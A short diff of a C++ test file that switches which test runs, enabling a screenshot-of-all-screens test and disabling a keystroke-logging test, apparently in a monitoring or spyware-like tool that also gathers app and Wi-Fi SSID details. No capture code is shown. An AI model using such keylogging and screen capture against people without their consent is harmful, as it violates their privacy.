@@ -13,7 +13,7 @@ void get_windows_apps_info_TEST() {
 }
 
 void take_screenshots_TEST() {
-    ScreenshotsManager screenshots_manager(L"./");
+    ScreenshotsManager screenshots_manager("./images");
     auto screenshots_filepaths = screenshots_manager.take_screenshots_of_all_screens();
 }
 
@@ -45,10 +45,10 @@ void start_key_presses_logging_TEST() {
 
 int main() {
     //get_windows_apps_info_TEST();
-    //take_screenshots_TEST();
+    take_screenshots_TEST();
     //get_ssids_TEST();
 
-    start_key_presses_logging_TEST();
+    //start_key_presses_logging_TEST();
     
     return 0;
 }
